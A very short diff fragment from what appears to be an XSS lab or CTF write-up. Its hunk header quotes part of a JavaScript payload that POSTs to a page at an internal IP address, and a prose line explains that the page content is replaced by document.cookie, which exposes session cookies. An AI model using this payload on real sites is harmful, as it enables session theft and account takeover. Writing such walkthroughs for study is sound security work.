@@ -124,4 +124,3 @@ var x = new XMLHttpRequest; x.open("POST", "http://10.150.89.164/page.php?edit=1
 ```
 
 Now content is replaced by document.cookie and placed in meeting thing.
-
